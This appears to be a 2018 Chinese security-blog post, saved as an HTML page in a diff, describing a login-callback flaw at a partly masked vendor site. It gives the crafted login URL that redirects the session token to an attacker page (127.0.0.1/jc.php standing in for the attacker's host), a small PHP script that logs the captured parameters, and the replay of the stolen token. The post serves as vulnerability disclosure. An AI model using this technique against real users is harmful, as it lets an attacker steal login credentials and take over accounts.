@@ -1,0 +1,495 @@
+<!DOCTYPE html>
+<html>
+<head>
+    
+
+    
+
+    
+
+
+
+    <meta charset="utf-8">
+    
+    
+    
+    
+    <title>某厂因登录处利用GET请求传递的参数而造成可劫持登录凭据 | $_Fuck | 白天搞笑的废物，晚上抑郁的怪物。</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+    
+    <meta name="theme-color" content="#3F51B5">
+    
+    
+    <meta name="keywords" content="Web安全">
+    <meta name="description" content="漏洞挖于18年，在其他平台发布过，都是原创。1、打开url：http:&#x2F;&#x2F;xxx.xxx.com&#x2F;contact&#x2F;portal&#x2F;pim&#x2F;index.shtml  2、点击登陆，并且抓包，抓取的数据包如下 1GET &amp;#x2F;wauthen&amp;#x2F;login?xx.action&amp;#x3D;uilogin&amp;amp;xx.realm&amp;#x3D;cloud.lps.xxx.com&amp;amp;xx.ui">
+<meta name="keywords" content="Web安全">
+<meta property="og:type" content="article">
+<meta property="og:title" content="某厂因登录处利用GET请求传递的参数而造成可劫持登录凭据">
+<meta property="og:url" content="http:&#x2F;&#x2F;yoursite.com&#x2F;2018&#x2F;12&#x2F;18&#x2F;%E6%9F%90%E5%8E%82%E5%9B%A0%E7%99%BB%E5%BD%95%E5%A4%84%E5%88%A9%E7%94%A8GET%E8%AF%B7%E6%B1%82%E4%BC%A0%E9%80%92%E7%9A%84%E5%8F%82%E6%95%B0%E8%80%8C%E9%80%A0%E6%88%90%E5%8F%AF%E5%8A%AB%E6%8C%81%E7%99%BB%E5%BD%95%E5%87%AD%E6%8D%AE&#x2F;index.html">
+<meta property="og:site_name" content="$_Fuck">
+<meta property="og:description" content="漏洞挖于18年，在其他平台发布过，都是原创。1、打开url：http:&#x2F;&#x2F;xxx.xxx.com&#x2F;contact&#x2F;portal&#x2F;pim&#x2F;index.shtml  2、点击登陆，并且抓包，抓取的数据包如下 1GET &amp;#x2F;wauthen&amp;#x2F;login?xx.action&amp;#x3D;uilogin&amp;amp;xx.realm&amp;#x3D;cloud.lps.xxx.com&amp;amp;xx.ui">
+<meta property="og:locale" content="zh">
+<meta property="og:image" content="http:&#x2F;&#x2F;static.zybuluo.com&#x2F;1kbfree&#x2F;xag1ninzr6aev0js0p4fyva6&#x2F;1.png">
+<meta property="og:image" content="http:&#x2F;&#x2F;static.zybuluo.com&#x2F;1kbfree&#x2F;5wopy4s1eclm62a7wm3ovljj&#x2F;1.png">
+<meta property="og:image" content="http:&#x2F;&#x2F;static.zybuluo.com&#x2F;1kbfree&#x2F;gmjjr43tg2qjwihva05513ld&#x2F;1.png">
+<meta property="og:image" content="http:&#x2F;&#x2F;static.zybuluo.com&#x2F;1kbfree&#x2F;e0qelsjueejcerznngtqm74p&#x2F;1.png">
+<meta property="og:updated_time" content="2019-12-18T00:28:14.636Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http:&#x2F;&#x2F;static.zybuluo.com&#x2F;1kbfree&#x2F;xag1ninzr6aev0js0p4fyva6&#x2F;1.png">
+    
+    <link rel="shortcut icon" href="/favicon.ico">
+    <link rel="stylesheet" href="/css/style.css?v=1.7.2">
+    <script>window.lazyScripts=[]</script>
+
+    <!-- custom head -->
+    
+
+</head>
+
+<body>
+    <div id="loading" class="active"></div>
+
+    <aside id="menu" class="" >
+  <div class="inner flex-row-vertical">
+    <a href="javascript:;" target="_blank" rel="noopener" class="header-icon waves-effect waves-circle waves-light" id="menu-off">
+        <i class="icon icon-lg icon-close"></i>
+    </a>
+    <div class="brand-wrap" style="background-image:url(/img/brand.jpg)">
+      <div class="brand">
+        <a href="/" class="avatar waves-effect waves-circle waves-light">
+          <img src="/img/blog.jpg">
+        </a>
+        <hgroup class="introduce">
+          <h5 class="nickname">$_Fuck</h5>
+          <a href="mailto:以凡人之躯比肩神明" target="_blank" rel="noopener" title="以凡人之躯比肩神明" class="mail">以凡人之躯比肩神明</a>
+        </hgroup>
+      </div>
+    </div>
+    <div class="scroll-wrap flex-col">
+      <ul class="nav">
+        
+            <li class="waves-block waves-effect">
+              <a href="/"  >
+                <i class="icon icon-lg icon-home"></i>
+                主页
+              </a>
+            </li>
+        
+            <li class="waves-block waves-effect">
+              <a href="/about"  >
+                <i class="icon icon-lg icon-address-book"></i>
+                About
+              </a>
+            </li>
+        
+            <li class="waves-block waves-effect">
+              <a href="/archives"  >
+                <i class="icon icon-lg icon-archives"></i>
+                Archives
+              </a>
+            </li>
+        
+            <li class="waves-block waves-effect">
+              <a href="/tags/Web%E5%AE%89%E5%85%A8/"  >
+                <i class="icon icon-lg icon-tags"></i>
+                Tags
+              </a>
+            </li>
+        
+            <li class="waves-block waves-effect">
+              <a href="/categories/%E5%85%B4%E8%B6%A3%E7%88%B1%E5%A5%BD"  >
+                <i class="icon icon-lg icon-th-list"></i>
+                Categories
+              </a>
+            </li>
+        
+            <li class="waves-block waves-effect">
+              <a href="/link"  >
+                <i class="icon icon-lg icon-link"></i>
+                友情链接
+              </a>
+            </li>
+        
+      </ul>
+    </div>
+  </div>
+</aside>
+
+    <main id="main">
+        <header class="top-header" id="header">
+    <div class="flex-row">
+        <a href="javascript:;" target="_blank" rel="noopener" class="header-icon waves-effect waves-circle waves-light on" id="menu-toggle">
+          <i class="icon icon-lg icon-navicon"></i>
+        </a>
+        <div class="flex-col header-title ellipsis">某厂因登录处利用GET请求传递的参数而造成可劫持登录凭据</div>
+        
+        <div class="search-wrap" id="search-wrap">
+            <a href="javascript:;" target="_blank" rel="noopener" class="header-icon waves-effect waves-circle waves-light" id="back">
+                <i class="icon icon-lg icon-chevron-left"></i>
+            </a>
+            <input type="text" id="key" class="search-input" autocomplete="off" placeholder="Search">
+            <a href="javascript:;" target="_blank" rel="noopener" class="header-icon waves-effect waves-circle waves-light" id="search">
+                <i class="icon icon-lg icon-search"></i>
+            </a>
+        </div>
+        
+        
+        <a href="javascript:;" target="_blank" rel="noopener" class="header-icon waves-effect waves-circle waves-light" id="menuShare">
+            <i class="icon icon-lg icon-share-alt"></i>
+        </a>
+        
+    </div>
+</header>
+<header class="content-header post-header">
+
+    <div class="container fade-scale">
+        <h1 class="title">某厂因登录处利用GET请求传递的参数而造成可劫持登录凭据</h1>
+        <h5 class="subtitle">
+            
+                <time datetime="2018-12-18T00:14:26.000Z" itemprop="datePublished" class="page-time">
+  2018-12-18
+</time>
+
+
+	<ul class="article-category-list"><li class="article-category-list-item"><a class="article-category-list-link" href="/categories/%E5%85%B4%E8%B6%A3%E7%88%B1%E5%A5%BD/">兴趣爱好</a></li></ul>
+
+            
+        </h5>
+    </div>
+
+    
+
+
+</header>
+
+
+<div class="container-fluid blog body-wrap">
+    
+    <aside class="post-widget">
+        <nav class="post-toc-wrap post-toc-shrink" id="post-toc">
+            <h4>TOC</h4>
+            <ol class="post-toc"><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#漏洞挖于18年，在其他平台发布过，都是原创。"><span class="post-toc-number">1.</span> <span class="post-toc-text">漏洞挖于18年，在其他平台发布过，都是原创。</span></a></li></ol>
+        </nav>
+    </aside>
+
+
+<article id="post-某厂因登录处利用GET请求传递的参数而造成可劫持登录凭据"
+  class="post-article article-type-post fade" itemprop="blogPost">
+
+    <div class="post-card">
+        <h1 class="post-card-title">某厂因登录处利用GET请求传递的参数而造成可劫持登录凭据</h1>
+        <div class="post-meta">
+            <time class="post-time" title="2018-12-18 08:14:26" datetime="2018-12-18T00:14:26.000Z"  itemprop="datePublished">2018-12-18</time>
+
+            
+	<ul class="article-category-list"><li class="article-category-list-item"><a class="article-category-list-link" href="/categories/%E5%85%B4%E8%B6%A3%E7%88%B1%E5%A5%BD/">兴趣爱好</a></li></ul>
+
+
+
+            
+<span id="busuanzi_container_page_pv" title="文章总阅读量" style='display:none'>
+    <i class="icon icon-eye icon-pr"></i><span id="busuanzi_value_page_pv"></span>
+</span>
+
+
+        </div>
+        <div class="post-content" id="post-content" itemprop="postContent">
+            <h2 id="漏洞挖于18年，在其他平台发布过，都是原创。"><a href="#漏洞挖于18年，在其他平台发布过，都是原创。" class="headerlink" title="漏洞挖于18年，在其他平台发布过，都是原创。"></a>漏洞挖于18年，在其他平台发布过，都是原创。</h2><p>1、打开url：<a href="http://xxx.xxx.com/contact/portal/pim/index.shtml" target="_blank" rel="noopener">http://xxx.xxx.com/contact/portal/pim/index.shtml</a></p>
+<p><img src="http://static.zybuluo.com/1kbfree/xag1ninzr6aev0js0p4fyva6/1.png" alt=""></p>
+<p>2、点击登陆，并且抓包，抓取的数据包如下</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span></pre></td><td class="code"><pre><span class="line">GET &#x2F;wauthen&#x2F;login?xx.action&#x3D;uilogin&amp;xx.realm&#x3D;cloud.lps.xxx.com&amp;xx.uinfo&#x3D;username,nickname,pid&amp;xx.lang&#x3D;zh_CN&amp;xx.ctx&#x3D;aHR0cDovL3RvbmdidS5sZW5vdm8uY29tL2NvbnRhY3QvY29udGFjdC9wb3J0YWwvaG9tZS5odG1s&amp;xx.cb&#x3D;https%3A%2F%2Ftongbu.xxx.com%2Fcontact%2Fcontact%2Fportal%2FinitSession&amp;xx.source&#x3D;tongbu.xxx.com&amp;display&#x3D; HTTP&#x2F;1.1</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">2</span></pre></td><td class="code"><pre><span class="line">Host: xxx.xxx.xxx</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">3</span></pre></td><td class="code"><pre><span class="line">User-Agent: Mozilla&#x2F;5.0 (Windows NT 6.3; rv:36.0) Gecko&#x2F;20100101 Firefox&#x2F;36.04</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">4</span></pre></td><td class="code"><pre><span class="line">Accept: text&#x2F;html,application&#x2F;xhtml+xml,application&#x2F;xml;q&#x3D;0.9,*&#x2F;*;q&#x3D;0.8</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">5</span></pre></td><td class="code"><pre><span class="line">Accept-Language: zh-CN,zh;q&#x3D;0.8,en-US;q&#x3D;0.5,en;q&#x3D;0.3</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">6</span></pre></td><td class="code"><pre><span class="line">Accept-Encoding: gzip, deflate</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">7</span></pre></td><td class="code"><pre><span class="line">DNT: 1</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">8</span></pre></td><td class="code"><pre><span class="line">Referer: http:&#x2F;&#x2F;xxxxx.xxx&#x2F;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">9</span></pre></td><td class="code"><pre><span class="line">Cookie: </span></pre></td></tr><tr><td class="gutter"><pre><span class="line">10</span></pre></td><td class="code"><pre><span class="line">Connection: close</span></pre></td></tr></table></figure>
+
+<p>注意数据包里的<code>xx.cb</code>，我们将其修改为<code>http://127.0.0.1/jc.php</code></p>
+<p>jc.php文件的代码是：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span></pre></td><td class="code"><pre><span class="line">&lt;?php</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">2</span></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F; 因为是演示，所以单纯只是打印，而不是将其存储至数据库</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">3</span></pre></td><td class="code"><pre><span class="line">echo &quot;&lt;pre&gt;&quot;;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">4</span></pre></td><td class="code"><pre><span class="line">var_dump( $_GET );</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">5</span></pre></td><td class="code"><pre><span class="line">?&gt;</span></pre></td></tr></table></figure>
+
+<p><img src="http://static.zybuluo.com/1kbfree/5wopy4s1eclm62a7wm3ovljj/1.png" alt="1.png-276.6kB"></p>
+<p>修改后的url为:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;passport.xxx.com&#x2F;wauthen&#x2F;login?xx.action&#x3D;uilogin&amp;xx.realm&#x3D;cloud.lps.xxx.com&amp;xx.uinfo&#x3D;username,nickname,pid&amp;xx.lang&#x3D;zh_CN&amp;xx.ctx&#x3D;aHR0cDovL3RvbmdidS5sZW5vdm8uY29tL2NvbnRhY3QvY29udGFjdC9wb3J0YWwvaG9tZS5odG1s&amp;xx.cb&#x3D;http:&#x2F;&#x2F;127.0.0.1&#x2F;jc.php&amp;xx.source&#x3D;tongbu.xxx.com&amp;display&#x3D;</span></pre></td></tr></table></figure>
+
+<p>放包，会来到登陆页面</p>
+<p>3、输入正确的密码，并且点击登陆</p>
+<p><img src="http://static.zybuluo.com/1kbfree/gmjjr43tg2qjwihva05513ld/1.png" alt="1.png-324.1kB"></p>
+<p><em>成功的获取了用户的登陆凭证</em></p>
+<p>4、修改为登陆凭据</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;tongbu.xxx.com&#x2F;contact&#x2F;contact&#x2F;portal&#x2F;initSession?xx.action&#x3D;uilogin&amp;xx.realm&#x3D;cloud.lps.xxx.com&amp;xx.wust&#x3D;ZAgAAAAAAAGE9MTAxMjM5MjQ3MDkmYj0xJmM9NCZkPTEwMTIxJmU9ODcxRUNDMTA4N0M4MzhGNzU1QjhGOUJFRjUxRkQzMDMxJmg9MTUzMTcxMDE4NzUwMCZpPTQzMjAwJmlsPWNuJnVzZXJuYW1lPTE1MTE5MzMwMzc2yFbCIH3Sep4W5Ye4v27TQw&amp;xx.ctx&#x3D;aHR0cDovL3RvbmdidS5sZW5vdm8uY29tL2NvbnRhY3QvY29udGFjdC9wb3J0YWwvaG9tZS5odG1s&amp;xx.lang&#x3D;zh_CN&amp;xx.vp&#x3D;</span></pre></td></tr></table></figure>
+
+<p><img src="http://static.zybuluo.com/1kbfree/e0qelsjueejcerznngtqm74p/1.png" alt="1.png-289.9kB"></p>
+<p>成功的访问，那么利用的话是很简单的，只需要将如下url发送给用户：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;passport.xxx.com&#x2F;wauthen&#x2F;login?xx.action&#x3D;uilogin&amp;xx.realm&#x3D;cloud.lps.xxx.com&amp;xx.uinfo&#x3D;username,nickname,pid&amp;xx.lang&#x3D;zh_CN&amp;xx.ctx&#x3D;aHR0cDovL3RvbmdidS5sZW5vdm8uY29tL2NvbnRhY3QvY29udGFjdC9wb3J0YWwvaG9tZS5odG1s&amp;xx.cb&#x3D;http:&#x2F;&#x2F;127.0.0.1&#x2F;jc.php&amp;xx.source&#x3D;tongbu.xxx.com&amp;display&#x3D;</span></pre></td></tr></table></figure>
+<p>用户打开后，输入账号和密码我们就可以成功的获取用户的登陆凭据（假设<code>127.0.0.1</code>是域名，假设<code>jc.php</code>是将<code>get</code>请求的所有数据保存到数据库了）</p>
+
+        </div>
+
+        <blockquote class="post-copyright">
+    
+    <div class="content">
+        
+<span class="post-time">
+    Last updated: <time datetime="2019-12-18T00:28:14.636Z" itemprop="dateUpdated">2019-12-18 08:28:14</time>
+</span><br>
+
+
+        
+        未经允许，禁止转载：<a href="/2018/12/18/%E6%9F%90%E5%8E%82%E5%9B%A0%E7%99%BB%E5%BD%95%E5%A4%84%E5%88%A9%E7%94%A8GET%E8%AF%B7%E6%B1%82%E4%BC%A0%E9%80%92%E7%9A%84%E5%8F%82%E6%95%B0%E8%80%8C%E9%80%A0%E6%88%90%E5%8F%AF%E5%8A%AB%E6%8C%81%E7%99%BB%E5%BD%95%E5%87%AD%E6%8D%AE/" target="_blank" rel="external">http://yoursite.com/2018/12/18/%E6%9F%90%E5%8E%82%E5%9B%A0%E7%99%BB%E5%BD%95%E5%A4%84%E5%88%A9%E7%94%A8GET%E8%AF%B7%E6%B1%82%E4%BC%A0%E9%80%92%E7%9A%84%E5%8F%82%E6%95%B0%E8%80%8C%E9%80%A0%E6%88%90%E5%8F%AF%E5%8A%AB%E6%8C%81%E7%99%BB%E5%BD%95%E5%87%AD%E6%8D%AE/</a>
+        
+    </div>
+    
+    <footer>
+        <a href="http://yoursite.com">
+            <img src="/img/blog.jpg" alt="$_Fuck">
+            $_Fuck
+        </a>
+    </footer>
+</blockquote>
+
+        
+<div class="page-reward">
+    <a id="rewardBtn" href="javascript:;" target="_blank" rel="noopener" class="page-reward-btn waves-effect waves-circle waves-light">赏</a>
+</div>
+
+
+
+        <div class="post-footer">
+            
+	<ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Web%E5%AE%89%E5%85%A8/" rel="tag">Web安全</a></li></ul>
+
+
+            
+<div class="page-share-wrap">
+    
+
+<div class="page-share" id="pageShare">
+    <ul class="reset share-icons">
+      <li>
+        <a class="weibo share-sns" target="_blank" href="http://service.weibo.com/share/share.php?url=http://yoursite.com/2018/12/18/%E6%9F%90%E5%8E%82%E5%9B%A0%E7%99%BB%E5%BD%95%E5%A4%84%E5%88%A9%E7%94%A8GET%E8%AF%B7%E6%B1%82%E4%BC%A0%E9%80%92%E7%9A%84%E5%8F%82%E6%95%B0%E8%80%8C%E9%80%A0%E6%88%90%E5%8F%AF%E5%8A%AB%E6%8C%81%E7%99%BB%E5%BD%95%E5%87%AD%E6%8D%AE/&title=《某厂因登录处利用GET请求传递的参数而造成可劫持登录凭据》 — $_Fuck&pic=http://yoursite.com/img/blog.jpg" data-title="微博">
+          <i class="icon icon-weibo"></i>
+        </a>
+      </li>
+      <li>
+        <a class="weixin share-sns wxFab" href="javascript:;" target="_blank" rel="noopener" data-title="微信">
+          <i class="icon icon-weixin"></i>
+        </a>
+      </li>
+      <li>
+        <a class="qq share-sns" target="_blank" href="http://connect.qq.com/widget/shareqq/index.html?url=http://yoursite.com/2018/12/18/%E6%9F%90%E5%8E%82%E5%9B%A0%E7%99%BB%E5%BD%95%E5%A4%84%E5%88%A9%E7%94%A8GET%E8%AF%B7%E6%B1%82%E4%BC%A0%E9%80%92%E7%9A%84%E5%8F%82%E6%95%B0%E8%80%8C%E9%80%A0%E6%88%90%E5%8F%AF%E5%8A%AB%E6%8C%81%E7%99%BB%E5%BD%95%E5%87%AD%E6%8D%AE/&title=《某厂因登录处利用GET请求传递的参数而造成可劫持登录凭据》 — $_Fuck&source=无助就算了，还要假装坚强。" data-title=" QQ">
+          <i class="icon icon-qq"></i>
+        </a>
+      </li>
+      <li>
+        <a class="facebook share-sns" target="_blank" href="https://www.facebook.com/sharer/sharer.php?u=http://yoursite.com/2018/12/18/%E6%9F%90%E5%8E%82%E5%9B%A0%E7%99%BB%E5%BD%95%E5%A4%84%E5%88%A9%E7%94%A8GET%E8%AF%B7%E6%B1%82%E4%BC%A0%E9%80%92%E7%9A%84%E5%8F%82%E6%95%B0%E8%80%8C%E9%80%A0%E6%88%90%E5%8F%AF%E5%8A%AB%E6%8C%81%E7%99%BB%E5%BD%95%E5%87%AD%E6%8D%AE/" data-title=" Facebook">
+          <i class="icon icon-facebook"></i>
+        </a>
+      </li>
+      <li>
+        <a class="twitter share-sns" target="_blank" href="https://twitter.com/intent/tweet?text=《某厂因登录处利用GET请求传递的参数而造成可劫持登录凭据》 — $_Fuck&url=http://yoursite.com/2018/12/18/%E6%9F%90%E5%8E%82%E5%9B%A0%E7%99%BB%E5%BD%95%E5%A4%84%E5%88%A9%E7%94%A8GET%E8%AF%B7%E6%B1%82%E4%BC%A0%E9%80%92%E7%9A%84%E5%8F%82%E6%95%B0%E8%80%8C%E9%80%A0%E6%88%90%E5%8F%AF%E5%8A%AB%E6%8C%81%E7%99%BB%E5%BD%95%E5%87%AD%E6%8D%AE/&via=http://yoursite.com" data-title=" Twitter">
+          <i class="icon icon-twitter"></i>
+        </a>
+      </li>
+      <li>
+        <a class="google share-sns" target="_blank" href="https://plus.google.com/share?url=http://yoursite.com/2018/12/18/%E6%9F%90%E5%8E%82%E5%9B%A0%E7%99%BB%E5%BD%95%E5%A4%84%E5%88%A9%E7%94%A8GET%E8%AF%B7%E6%B1%82%E4%BC%A0%E9%80%92%E7%9A%84%E5%8F%82%E6%95%B0%E8%80%8C%E9%80%A0%E6%88%90%E5%8F%AF%E5%8A%AB%E6%8C%81%E7%99%BB%E5%BD%95%E5%87%AD%E6%8D%AE/" data-title=" Google+">
+          <i class="icon icon-google-plus"></i>
+        </a>
+      </li>
+    </ul>
+ </div>
+
+
+
+    <a href="javascript:;" target="_blank" rel="noopener" id="shareFab" class="page-share-fab waves-effect waves-circle">
+        <i class="icon icon-share-alt icon-lg"></i>
+    </a>
+</div>
+
+
+
+        </div>
+    </div>
+
+    
+<nav class="post-nav flex-row flex-justify-between">
+  
+    <div class="waves-block waves-effect prev">
+      <a href="/2018/12/18/%E8%8E%B7%E5%8F%96%E7%9C%9F%E5%AE%9EIP%E6%96%B9%E6%B3%95%E3%80%90%E7%BB%95%E8%BF%87CDN%E3%80%91/" id="post-prev" class="post-nav-link">
+        <div class="tips"><i class="icon icon-angle-left icon-lg icon-pr"></i> Prev</div>
+        <h4 class="title">获取真实IP方法【绕过CDN】</h4>
+      </a>
+    </div>
+  
+
+  
+    <div class="waves-block waves-effect next">
+      <a href="/2018/12/13/%E7%8C%AB%E7%9C%BC%E5%A4%B4%E5%83%8F%E4%B8%8A%E4%BC%A0%E5%A4%84%E5%AD%98%E5%9C%A8ssrf/" id="post-next" class="post-nav-link">
+        <div class="tips">Next <i class="icon icon-angle-right icon-lg icon-pl"></i></div>
+        <h4 class="title">猫眼头像上传处存在ssrf</h4>
+      </a>
+    </div>
+  
+</nav>
+
+
+
+    
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+</article>
+
+<div id="reward" class="page-modal reward-lay">
+    <a class="close" href="javascript:;" target="_blank" rel="noopener"><i class="icon icon-close"></i></a>
+    <h3 class="reward-title">
+        <i class="icon icon-quote-left"></i>
+        禁止打赏~
+        <i class="icon icon-quote-right"></i>
+    </h3>
+    <div class="reward-content">
+        
+        <div class="reward-code">
+            <img id="rewardCode" src="/img/" alt="打赏二维码">
+        </div>
+        
+        <label class="reward-toggle">
+            <input id="rewardToggle" type="checkbox" class="reward-toggle-check"
+                data-wechat="/img/" data-alipay="/img/">
+            <div class="reward-toggle-ctrol">
+                <span class="reward-toggle-item wechat">微信</span>
+                <span class="reward-toggle-label"></span>
+                <span class="reward-toggle-item alipay">支付宝</span>
+            </div>
+        </label>
+        
+    </div>
+</div>
+
+
+
+</div>
+
+        
+    </main>
+    <div class="mask" id="mask"></div>
+<a href="javascript:;" target="_blank" rel="noopener" id="gotop" class="waves-effect waves-circle waves-light"><span class="icon icon-lg icon-chevron-up"></span></a>
+
+
+
+<div class="global-share" id="globalShare">
+    <ul class="reset share-icons">
+      <li>
+        <a class="weibo share-sns" target="_blank" href="http://service.weibo.com/share/share.php?url=http://yoursite.com/2018/12/18/%E6%9F%90%E5%8E%82%E5%9B%A0%E7%99%BB%E5%BD%95%E5%A4%84%E5%88%A9%E7%94%A8GET%E8%AF%B7%E6%B1%82%E4%BC%A0%E9%80%92%E7%9A%84%E5%8F%82%E6%95%B0%E8%80%8C%E9%80%A0%E6%88%90%E5%8F%AF%E5%8A%AB%E6%8C%81%E7%99%BB%E5%BD%95%E5%87%AD%E6%8D%AE/&title=《某厂因登录处利用GET请求传递的参数而造成可劫持登录凭据》 — $_Fuck&pic=http://yoursite.com/img/blog.jpg" data-title="微博">
+          <i class="icon icon-weibo"></i>
+        </a>
+      </li>
+      <li>
+        <a class="weixin share-sns wxFab" href="javascript:;" target="_blank" rel="noopener" data-title="微信">
+          <i class="icon icon-weixin"></i>
+        </a>
+      </li>
+      <li>
+        <a class="qq share-sns" target="_blank" href="http://connect.qq.com/widget/shareqq/index.html?url=http://yoursite.com/2018/12/18/%E6%9F%90%E5%8E%82%E5%9B%A0%E7%99%BB%E5%BD%95%E5%A4%84%E5%88%A9%E7%94%A8GET%E8%AF%B7%E6%B1%82%E4%BC%A0%E9%80%92%E7%9A%84%E5%8F%82%E6%95%B0%E8%80%8C%E9%80%A0%E6%88%90%E5%8F%AF%E5%8A%AB%E6%8C%81%E7%99%BB%E5%BD%95%E5%87%AD%E6%8D%AE/&title=《某厂因登录处利用GET请求传递的参数而造成可劫持登录凭据》 — $_Fuck&source=无助就算了，还要假装坚强。" data-title=" QQ">
+          <i class="icon icon-qq"></i>
+        </a>
+      </li>
+      <li>
+        <a class="facebook share-sns" target="_blank" href="https://www.facebook.com/sharer/sharer.php?u=http://yoursite.com/2018/12/18/%E6%9F%90%E5%8E%82%E5%9B%A0%E7%99%BB%E5%BD%95%E5%A4%84%E5%88%A9%E7%94%A8GET%E8%AF%B7%E6%B1%82%E4%BC%A0%E9%80%92%E7%9A%84%E5%8F%82%E6%95%B0%E8%80%8C%E9%80%A0%E6%88%90%E5%8F%AF%E5%8A%AB%E6%8C%81%E7%99%BB%E5%BD%95%E5%87%AD%E6%8D%AE/" data-title=" Facebook">
+          <i class="icon icon-facebook"></i>
+        </a>
+      </li>
+      <li>
+        <a class="twitter share-sns" target="_blank" href="https://twitter.com/intent/tweet?text=《某厂因登录处利用GET请求传递的参数而造成可劫持登录凭据》 — $_Fuck&url=http://yoursite.com/2018/12/18/%E6%9F%90%E5%8E%82%E5%9B%A0%E7%99%BB%E5%BD%95%E5%A4%84%E5%88%A9%E7%94%A8GET%E8%AF%B7%E6%B1%82%E4%BC%A0%E9%80%92%E7%9A%84%E5%8F%82%E6%95%B0%E8%80%8C%E9%80%A0%E6%88%90%E5%8F%AF%E5%8A%AB%E6%8C%81%E7%99%BB%E5%BD%95%E5%87%AD%E6%8D%AE/&via=http://yoursite.com" data-title=" Twitter">
+          <i class="icon icon-twitter"></i>
+        </a>
+      </li>
+      <li>
+        <a class="google share-sns" target="_blank" href="https://plus.google.com/share?url=http://yoursite.com/2018/12/18/%E6%9F%90%E5%8E%82%E5%9B%A0%E7%99%BB%E5%BD%95%E5%A4%84%E5%88%A9%E7%94%A8GET%E8%AF%B7%E6%B1%82%E4%BC%A0%E9%80%92%E7%9A%84%E5%8F%82%E6%95%B0%E8%80%8C%E9%80%A0%E6%88%90%E5%8F%AF%E5%8A%AB%E6%8C%81%E7%99%BB%E5%BD%95%E5%87%AD%E6%8D%AE/" data-title=" Google+">
+          <i class="icon icon-google-plus"></i>
+        </a>
+      </li>
+    </ul>
+ </div>
+
+
+<div class="page-modal wx-share" id="wxShare">
+    <a class="close" href="javascript:;" target="_blank" rel="noopener"><i class="icon icon-close"></i></a>
+    <p>扫一扫，分享到微信</p>
+    <img src="//api.qrserver.com/v1/create-qr-code/?data=http://yoursite.com/2018/12/18/%E6%9F%90%E5%8E%82%E5%9B%A0%E7%99%BB%E5%BD%95%E5%A4%84%E5%88%A9%E7%94%A8GET%E8%AF%B7%E6%B1%82%E4%BC%A0%E9%80%92%E7%9A%84%E5%8F%82%E6%95%B0%E8%80%8C%E9%80%A0%E6%88%90%E5%8F%AF%E5%8A%AB%E6%8C%81%E7%99%BB%E5%BD%95%E5%87%AD%E6%8D%AE/" alt="微信分享二维码">
+</div>
+
+
+
+
+    <script src="//cdn.bootcss.com/node-waves/0.7.4/waves.min.js"></script>
+<script>
+var BLOG = { ROOT: '/', SHARE: true, REWARD: true };
+
+
+</script>
+
+<script src="/js/main.min.js?v=1.7.2"></script>
+
+
+<div class="search-panel" id="search-panel">
+    <ul class="search-result" id="search-result"></ul>
+</div>
+<template id="search-tpl">
+<li class="item">
+    <a href="{path}" class="waves-block waves-effect">
+        <div class="title ellipsis" title="{title}">{title}</div>
+        <div class="flex-row flex-middle">
+            <div class="tags ellipsis">
+                {tags}
+            </div>
+            <time class="flex-col time">{date}</time>
+        </div>
+    </a>
+</li>
+</template>
+
+<script src="/js/search.min.js?v=1.7.2" async></script>
+
+
+
+
+
+
+<script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+
+
+
+<script>
+(function() {
+    var OriginTitile = document.title, titleTime;
+    document.addEventListener('visibilitychange', function() {
+        if (document.hidden) {
+            document.title = 'Bay！';
+            clearTimeout(titleTime);
+        } else {
+            document.title = 'Fuck的博客~';
+            titleTime = setTimeout(function() {
+                document.title = OriginTitile;
+            },2000);
+        }
+    });
+})();
+</script>
+
+
+
+</body>
+</html>
